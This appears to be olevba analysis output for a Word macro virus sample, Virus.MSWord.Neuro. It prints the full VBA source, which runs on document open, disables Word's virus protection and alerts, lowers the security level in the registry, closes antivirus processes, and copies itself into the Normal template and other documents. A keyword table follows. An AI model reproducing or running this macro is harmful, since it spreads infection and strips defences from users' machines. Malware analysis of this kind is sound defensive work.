olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: ./Virus.MSWord.Neuro
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO EmGPFbBybXUfI.cls 
in file: ./Virus.MSWord.Neuro - OLE stream: 'Macros/VBA/EmGPFbBybXUfI'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Private Sub Document_Open()
On Error Resume Next
Set xQrWmKtBciLvBx = Word.Application
With xQrWmKtBciLvBx
.Options.VirusProtection = Not -1
.DisplayStatusBar = Not -1
.ScreenUpdating = Not -1
.Options.ConfirmConversions = Not -1
.DisplayAlerts = Not -1
.System.PrivateProfileString("", "HKEY_CURRENT_USER\Software\Microsoft\Office\9.0\Word\Security", "Level") = 1
End With
Call TsiMxiVBqCc
Set LkBeLeXBOVLdEeY = xQrWmKtBciLvBx.ActiveDocument.VBProject.VBComponents(1)
Set egStaeetTOJXiHhinU = xQrWmKtBciLvBx.NormalTemplate.VBProject.VBComponents(1)
If (LkBeLeXBOVLdEeY.Name <> "EmGPFbBybXUfI") Then
gdnxfNeIoX = egStaeetTOJXiHhinU.CodeModule.Lines(1, egStaeetTOJXiHhinU.CodeModule.CountOfLines)
LkBeLeXBOVLdEeY.CodeModule.AddFromString gdnxfNeIoX
LkBeLeXBOVLdEeY.Name = "EmGPFbBybXUfI"
ActiveDocument.Saved = True
End If
If (egStaeetTOJXiHhinU.Name <> "EmGPFbBybXUfI") Then
tNQLmRroK = LkBeLeXBOVLdEeY.CodeModule.Lines(1, LkBeLeXBOVLdEeY.CodeModule.CountOfLines)
egStaeetTOJXiHhinU.CodeModule.AddFromString tNQLmRroK
egStaeetTOJXiHhinU.Name = "EmGPFbBybXUfI"
NormalTemplate.Save
End If
End Sub
Private Sub TsiMxiVBqCc()
Set xlDkemqPglPy = Tasks
With xlDkemqPglPy
For SYarDLQwFl = 1 To .Count
If (.Item(SYarDLQwFl).Name = "AVP Monitor") Or (.Item(SYarDLQwFl).Name = "NAI_VS_STAT") Then .Item(SYarDLQwFl).Close
Next SYarDLQwFl
End With
End Sub
'Generated with [NEUROiD] v0.1

+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |Document_Open       |Runs when the Word or Publisher document is  |
|          |                    |opened                                       |
|Suspicious|Call                |May call a DLL using Excel 4 Macros (XLM/XLF)|
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|CodeModule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|AddFromString       |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|System              |May run an executable file or a system       |
|          |                    |command on a Mac (if combined with           |
|          |                    |libc.dylib)                                  |
+----------+--------------------+---------------------------------------------+

